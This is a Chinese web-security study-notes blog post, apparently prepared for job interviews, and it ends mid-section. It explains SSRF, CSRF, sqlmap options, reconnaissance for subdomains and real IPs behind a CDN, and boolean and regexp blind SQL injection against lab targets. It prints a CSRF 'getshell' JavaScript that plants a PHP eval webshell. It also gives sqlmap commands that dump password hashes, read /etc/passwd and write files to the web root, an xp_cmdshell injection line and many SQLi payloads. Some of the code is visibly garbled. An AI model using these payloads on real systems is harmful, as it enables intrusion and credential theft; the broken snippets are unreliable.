@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="响应码：200、302重定向、404未找到、500服务器错误、403被禁止 SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞， 它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。       当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定">
+<meta property="og:type" content="article">
+<meta property="og:title" content="interview">
+<meta property="og:url" content="http://example.com/2019/04/22/interview/index.html">
+<meta property="og:site_name" content="Erlee">
+<meta property="og:description" content="响应码：200、302重定向、404未找到、500服务器错误、403被禁止 SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞， 它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。       当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1555428552473.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554043896144.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554016830002.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554017028611.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554025935234.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554040600900.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554040934363.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554041228074.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554047306509.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554047568041.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554047808019.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/t01c82b98f9bd65effc.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/t01c161fc6c34cd8fde.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/t0101ef42a1afcf0ae7.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/t014e91c51e99d488d7.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554128693639.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554128418032.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/1554130494912.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/20180725163629473.png">
+<meta property="og:image" content="http://example.com/2019/04/22/interview/2018072516363889.png">
+<meta property="article:published_time" content="2019-04-22T23:17:00.000Z">
+<meta property="article:modified_time" content="2019-09-11T03:37:22.822Z">
+<meta property="article:author" content="Erlee">
+<meta property="article:tag" content="interview">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2019/04/22/interview/1555428552473.png">
+
+<link rel="canonical" href="http://example.com/2019/04/22/interview/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>interview | Erlee</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Erlee</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/04/22/interview/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/erlee.png">
+      <meta itemprop="name" content="Erlee">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Erlee">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          interview
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-04-22 19:17:00" itemprop="dateCreated datePublished" datetime="2019-04-22T19:17:00-04:00">2019-04-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-09-10 23:37:22" itemprop="dateModified" datetime="2019-09-10T23:37:22-04:00">2019-09-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%82/" itemprop="url" rel="index"><span itemprop="name">杂</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>响应码：200、302重定向、404未找到、500服务器错误、403被禁止</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞， 它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。       当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)， 但是没有对目标地址做过滤与限制时就会出现SSRF。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 从WEB功能上寻找 </span><br><span class="line">    通过URL分享内容</span><br><span class="line">    文件处理、编码处理、转码等服务</span><br><span class="line">    在线翻译</span><br><span class="line">    通过URL地址加载与下载图片</span><br><span class="line">    图片、文章的收藏</span><br><span class="line">    设置邮件接收服务器</span><br><span class="line">2. 从URL关键字寻找</span><br><span class="line">    share、wap、url、link、src、source、target、u、3g、</span><br><span class="line">    display、sourceURl、imageURL、domain...</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="1555428552473.png" alt="1555428552473"></p>
+<h1 id="Csrf"><a href="#Csrf" class="headerlink" title="Csrf"></a>Csrf</h1><p>攻击者盗用了你的身份，以你的名义发送恶意请求。</p>
+<p>1、登录受信任网站A，并在本地生成Cookie。</p>
+<p>2、在不登出A的情况下，访问危险网站B加固方法：</p>
+<ul>
+<li>改用只接受post数据   、</li>
+<li>在提交表单进行hash 加密 在服务端进行hash验证 （如果用户Cookie没有被盗取）</li>
+</ul>
+<p>一个getshell的js脚本 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function getshell</span><br><span class="line">&#123;</span><br><span class="line">	//创建文件名为muma,php的文件</span><br><span class="line">var xmlhttp1=new XMLHttpRequest()</span><br><span class="line">xmlhttpl.open(&quot;post&quot;,&quot;./templaTe.php?m=createfile&quot;,true)</span><br><span class="line">xmlhttpl.setrequesthEader(&quot;content-type&quot;,&quot;applIcation/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp1.send(&quot;filename=muma.php</span><br><span class="line">	//在muma.php文件中写入一句话</span><br><span class="line">var xmlhttp2=new XMLHttpReqest();</span><br><span class="line">xmlhttp2.open(&quot;post&quot;,&quot;./template.php?m=save_edit,true);</span><br><span class="line">xmlhttp2.setrequesthEader(&quot;content-type&quot;, plication/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp2.send(&quot;filename=muma.php&amp;content=%3C%Fphp+eval%28%24_POST_%5B%27cmd%27%5D%29%3B%3f%3e&quot;);</span><br><span class="line">getshell();</span><br></pre></td></tr></table></figure>
+
+<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><p>-u #注入点</p>
+<p>-f #指纹判别数据库类型</p>
+<p>-b #获取数据库版本信息</p>
+<p>-p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)</p>
+<p>-D “” #指定数据库名</p>
+<p>-T “” #指定表名</p>
+<p>-C “” #指定字段</p>
+<p>-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)</p>
+<p>–columns #列出字段</p>
+<p>–current-user #获取当前用户名称</p>
+<p>–current-db #获取当前数据库名称</p>
+<p>–users #列数据库所有用户</p>
+<p>–passwords #数据库用户所有密码</p>
+<p>–privileges #查看用户权限(–privileges -U root)</p>
+<p>-U #指定数据库用户</p>
+<p>–dbs #列出所有数据库</p>
+<p>–tables -D “” #列出指定数据库中的表</p>
+<p><strong>-v #<strong><strong>详细的等级</strong></strong>(0-6)</strong></p>
+<p>0：只显示Python的回溯，错误和关键消息。</p>
+<p>1：显示信息和警告消息。</p>
+<p>2：显示调试消息。</p>
+<p>3：有效载荷注入。</p>
+<p>4：显示HTTP请求。</p>
+<p>5：显示HTTP响应头。</p>
+<p>6：显示HTTP响应页面的内容 </p>
+<p>1.读取数据库版本，当前用户，当前数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 -f -b –current-user –current-db -v 1</span><br></pre></td></tr></table></figure>
+
+<p>2.判断当前数据库用户权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –privileges -U 用户名 -v 1</span><br><span class="line"></span><br><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –is-dba -U 用户名 -v 1</span><br></pre></td></tr></table></figure>
+
+<p>3.读取所有数据库用户或指定数据库用户的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-users –-passwords -v 2</span><br><span class="line"></span><br><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-passwords -U root -v 2</span><br></pre></td></tr></table></figure>
+
+<p>4.获取所有数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-dbs -v 2</span><br></pre></td></tr></table></figure>
+
+<p>5.获取指定数据库中的所有表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-tables -D mysql -v 2</span><br></pre></td></tr></table></figure>
+
+<p>6.获取指定数据库名中指定表的字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-columns -D mysql -T users -v 2</span><br></pre></td></tr></table></figure>
+
+<p>7.获取指定数据库名中指定表中指定字段的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2</span><br></pre></td></tr></table></figure>
+
+<p>8.file-read读取web文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-file-read “/etc/passwd” -v 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>9.file-write写入文件到web</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.91ri.org/ test.php?p=2 –-file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>被动信息搜集</p>
+<h1 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h1><p>收集其子域名：常用工具和方法，</p>
+<p>子域名扫描工具，如：layer、kali下的fierce（首先<em>尝试域传送漏洞</em>，如果不成功再尝试暴力破解）</p>
+<p>1、爬虫爬取页面源代码中的子域名 如：burp 带的Spider等。</p>
+<p>2、在线子域名查询网站、 <a target="_blank" rel="noopener" href="https://www.t00ls.net/ip.html">T00ls</a>、站长之家，<a target="_blank" rel="noopener" href="http://i.links.cn/subdomain/">等</a></p>
+<p>3、<a target="_blank" rel="noopener" href="https://crt.sh/">HTTPS</a> 证书搜集、ip反查、</p>
+<p>​                                                      </p>
+<h1 id="查找其真实ip"><a href="#查找其真实ip" class="headerlink" title="查找其真实ip"></a>查找其真实ip</h1><p><strong>验证是否存在****CDN</strong> </p>
+<p>·        nslookup url ，存在的或返回多个ip相反返回一个ip</p>
+<p>·        多地ping</p>
+<p><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
+<p><a target="_blank" rel="noopener" href="http://ping.aizhan.com/">http://ping.aizhan.com/</a> <a target="_blank" rel="noopener" href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
+<p>·        使用各种其他工具 ，直接查询是否使用了CDN</p>
+<p><a target="_blank" rel="noopener" href="http://www.cdnplanet.com/tools/cdnfinder/">http://www.cdnplanet.com/tools/cdnfinder/</a> <a target="_blank" rel="noopener" href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a></p>
+<p><strong>绕过****CDN</strong></p>
+<p>·        查看域名和ip绑定的历史 可能存在CDN 的记录 相关网站</p>
+<p><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> <a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> <a target="_blank" rel="noopener" href="http://toolbar.netcraft.com/site_report?url">http://toolbar.netcraft.com/site_report?url</a>= <a target="_blank" rel="noopener" href="http://viewdns.info/">http://viewdns.info/</a></p>
+<p>·        查询子域名 毕竟 很多小站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP</p>
+<p>·        利用</p>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><p>MSSQL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">http://www.mytest.com/showdetail.asp?id=49 ;and (select count(*) from sysobjects)&gt;0  页面正常</span><br><span class="line">http://www.mytest.com/showdetail.asp?id=49 ;and (select count(*) from msysobjects)&gt;0  异常，作为开启IIS错误提示时的验证</span><br><span class="line">`/*`是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下	查询字符：</span><br><span class="line">ID=1 and length(user)&gt;0</span><br><span class="line">id=2 and version()&gt;1 出现异常</span><br><span class="line">1 or 1=1</span><br><span class="line">&quot; or &quot;1&quot;=&quot;1</span><br><span class="line">1&#x27; or 1=1 --</span><br><span class="line">1&quot; or 1=1 --</span><br><span class="line">and 0</span><br><span class="line">and 1</span><br><span class="line">1&#x27; || &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;; exec master..xp_cmdshell &#x27;ping 10.10.1.2&#x27;--</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; union (select @@version) --</span><br><span class="line">&#x27; union (select NULL, (select @@version)) --</span><br><span class="line">&#x27; union (select NULL, NULL, (select @@version)) --</span><br><span class="line">&#x27; union (select NULL, NULL, NULL,  (select @@version)) --</span><br><span class="line">&#x27; union (select NULL, NULL, NULL, NULL,  (select @@version)) --</span><br><span class="line">&#x27; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --</span><br><span class="line">如果错误提示没有关闭，会报出用户名，如果是sa账号的话，会提示‘dbo’</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>数据库类型判断，一般asp 的网站大部分是Access或者 SQL server，</p>
+<p>Access</p>
+<p>判断方法和SqlServer前两个用法一样，不同的是页面都会异常</p>
+<p>oracle</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ID=1 and &#x27;1&#x27;||&#x27;1&#x27;=&#x27;11</span><br><span class="line">ID=1 and 0&lt;&gt;(selectcount(*)fromdual)</span><br><span class="line">ID=1CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>--</code>是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：</li>
+<li><code>;</code>是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</li>
+<li><code>--</code>是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一</li>
+<li>在注入点后加（必须为注入点）;–（一个分号，两个横线），例如：<a target="_blank" rel="noopener" href="https://link.jianshu.com/?t=http://xxxx/article/as.asp?id=1;--">http://xxxx/article/as.asp?id=1;–</a>。如果返回正常的话，说明数据库是MSSQL，在MSSQL数据库中;和–都是存在的，;用来分离两个语句，而–就是注释符，它后面语句都不执行。如果返回错误，基本可以肯定是ACCESS数据库了。</li>
+</ul>
+<p>mysql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id=2 and version()&gt;0返回正常 </span><br><span class="line">id=2 and version()&gt;1 返回与@@version&gt;1 相同页面时</span><br><span class="line">id=2 and len(user())&gt;0</span><br><span class="line">id=2CHAR(97,110,100,32,49,61,49)</span><br><span class="line">1 or 1=1</span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&quot; or &quot;1&quot;=&quot;1</span><br><span class="line">1&#x27; or 1=1 --</span><br><span class="line">1&quot; or 1=1 --</span><br><span class="line">and 0</span><br><span class="line">and 1</span><br><span class="line">1&#x27; || &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="基于bool的盲注"><a href="#基于bool的盲注" class="headerlink" title="基于bool的盲注"></a>基于bool的盲注</h2><p>注入方法都需要网页可以显示查询数据的结果，而盲注适合页面不显示任何数据查询结果</p>
+<ol>
+<li><p>这里普及一下盲注时的常用函数<br>mid()函数</p>
+<p>mid(striing,start,length)</p>
+<p>string(必需)规定要返回其中一部分的字符串。</p>
+<p>start(必需)规定开始位置（起始值是 1）。</p>
+<p>length(可选)要返回的字符数。如果省略，则 mid() 函数返回剩余文本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select mid((&#x27;asdf&#x27;)from(2))   //输出sdf</span><br><span class="line">select mid((&#x27;asdf&#x27;)from(2)for(1)) //输出 s</span><br><span class="line">select mid((&#x27;asdf&#x27;)from(2)FOR(2) )//输出 sd</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>substr()函数 </p>
+<p>SUBSTR(str FROM pos FOR len)</p>
+<p>str(必需)规定要返回其中一部分的字符串。</p>
+<p>pos(必需)规定在字符串的何处开始。</p>
+<p>len(可选)规定被返回字符串的长度。不选就输出  其后的所有</p>
+</li>
+<li><p>left()函数</p>
+<p>left(string,length)</p>
+<p>再怎么解释也不如直接开弄</p>
+<p>string(必需)规定要返回其中一部分的字符串</p>
+<p>length（可选）规定被返回字符串的前length长度的字符</p>
+<p>ascii(a)将a转换成其ASCII值 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left (database(),1)=2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="1554043896144.png" alt="1554043896144"></p>
+</li>
+</ol>
+<p>猜解数据库长度，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and length(database())&gt;2 %23  以次改变 显示正常时正确</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="1554016830002.png" alt="1554016830002"></p>
+<p>猜解数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and substr(database())&gt;&#x27;r&#x27; %23 同理判断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="1554017028611.png" alt="1554017028611"></p>
+<p>继续猜解第二个字符</p>
+<p>由此可推断第一个字符是s<br>接下来判断第二个字符：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;</a> and left(database(),2)&gt;’sd’%23</p>
+<p>‘sd’&lt;’当前数据库名的前两位字符’&lt;’sf’       所以当前数据库名的第二位字符为’e’。以此类推，最后得到当前数据库名为“security”</p>
+<p>猜解表名</p>
+<p>先猜解表名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1))&lt;5 %23  </span><br><span class="line">先判断范围 再用等号判断值  返回正确为止 </span><br><span class="line">实际执行</span><br><span class="line">select length((select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="1554025935234.png" alt="1554025935234"></p>
+<p>确定表明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and  ascii( mid((select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)from(2)for(1)) ) %23  这里进行assii 进行比较 逐个猜解</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>查询表的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;  and (select count(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27; )&gt;1 %23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="1554040600900.png" alt="1554040600900"></p>
+<p>查询列的个数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;  and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)&gt;2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在夹逼出列名</p>
+<p><img src="1554040934363.png" alt="1554040934363"></p>
+<p><img src="1554041228074.png" alt="1554041228074"></p>
+<h2 id="正则匹配的盲注-regexp注入"><a href="#正则匹配的盲注-regexp注入" class="headerlink" title="正则匹配的盲注  **regexp注入  **"></a><strong>正则匹配的盲注</strong>  **regexp注入  **</h2><p><img src="1554047306509.png" alt="1554047306509"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select (select password from users where id = 1)regexp&#x27;^e10&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>regexp这个关键字还可以代替where条件里的=号</p>
+<p><img src="1554047568041.png" alt="1554047568041"></p>
+<h2 id="使用场景过滤了-、in、like"><a href="#使用场景过滤了-、in、like" class="headerlink" title="使用场景过滤了=、in、like"></a>使用场景过滤了=、in、like</h2><p>这里的^如果也被过滤了的话，可以使用$来从后往前进行匹配</p>
+<p><img src="1554047808019.png" alt="1554047808019"></p>
+<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><h3 id="1、基本注入payload"><a href="#1、基本注入payload" class="headerlink" title="1、基本注入payload"></a>1、基本注入payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id = &#x27;1&#x27; union select 1,2,&#x27;a&#x27;,4,5,6,7 order by 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先先看看order by的使用方法：</p>
